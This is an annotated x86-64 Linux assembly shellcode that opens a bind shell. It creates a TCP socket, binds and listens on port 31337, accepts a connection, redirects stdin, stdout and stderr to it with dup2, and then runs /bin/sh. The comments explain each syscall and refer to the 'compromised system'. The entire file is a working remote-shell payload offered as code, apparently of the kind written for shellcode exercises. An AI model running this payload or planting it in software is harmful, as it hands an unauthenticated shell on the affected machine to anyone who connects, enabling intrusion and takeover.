global _start
section .text
 
_start:
    xor    rax,rax
    xor    rdi,rdi
    xor    rsi,rsi
    xor    rdx,rdx
    xor    r8,r8
 
    ; Socket
    ; Function prototype:
    ;       int socket(int domain, int type, int protocol)
    ; Purpose:
    ;       creates an endpoint for communications, returns a
    ;       descriptor that will be used thoughout the code to
    ;       bind/listen/accept communications
    push   0x2   
    pop    rdi
    push   0x1
    pop    rsi
    push   0x6
    pop    rdx
    push   0x29
    pop    rax
    syscall 
    mov    r8,rax
 
    ; Bind
    ; Function prototype:
    ;      int bind(int sockfd, const struct sockaddr *addr,      
    ;               socklen_t addrlen)                            
    ; Purpose:
    ;       assigns the addess in addr to the socket descriptor,
    ;       basically "giving a name to a socket"
    xor    r10,r10
    push   r10
    push   r10
    mov    byte [rsp],0x2
    mov    word [rsp+0x2],0x697a
    mov    rsi,rsp
    push   r8
    pop    rdi
    push   0x10
    pop    rdx
    push   0x31
    pop    rax
    syscall 
 
    ; Listen
    ; Function prototype:
    ;       int listen(int sockfd, int backlog)
    ; Purpose:
    ;       sets the socket in the descriptor in preparation to
    ;       accepting incoming communications
    push   r8
    pop    rdi
    push   0x1
    pop    rsi
    push   0x32
    pop    rax
    syscall 
 
    ; Accept
    ; Function prototype:
    ;       int accept(int sockfd, struct sockaddr *addr,
    ;               socklen_t *addrlen)
    ; Purpose:
    ;       accepts a connection on a socket and returns a new
    ;       file descriptor referring to the socket which is used
    ;       to bind stdin, stdout and stderr to the local terminal
    mov    rsi,rsp
    xor    rcx,rcx
    mov    cl,0x10
    push   rcx
    mov    rdx,rsp
    push   r8
    pop    rdi
    push   0x2b
    pop    rax
    syscall 
 
    ; Dup2
    ; Function prototype:
    ;       int dup2(int oldfd, int newfd)
    ; Purpose:
    ;       duplicate a file descriptor, copies the old file
    ;       descriptor to a new one allowing them to be used
    ;       interchangably, this allows all shell ops to/from the
    ;       compomised system.
    pop    rcx
    xor    r9,r9
    mov    r9,rax
    mov    rdi,r9
    xor    rsi,rsi
    push   0x3
    pop    rsi
doop:
    dec    rsi
    push   0x21
    pop    rax
    syscall 
    jne    doop
 
    ; Execve
    ; Function prototype:
    ;       int execve(const char *filename, char *const argv[],
    ;               char *const envp[]);
    ; Purpose:
    ;       execve() executes the program pointed to by filename.  
    ;       filename must be either a binary executable, or a script.   
    xor    rdi,rdi
    push   rdi
    push   rdi
    pop    rsi
    pop    rdx
    mov rdi,0x68732f6e69622f2f
    shr    rdi,0x8
    push   rdi
    push   rsp
    pop    rdi
    push   0x3b
    pop    rax
    syscall 
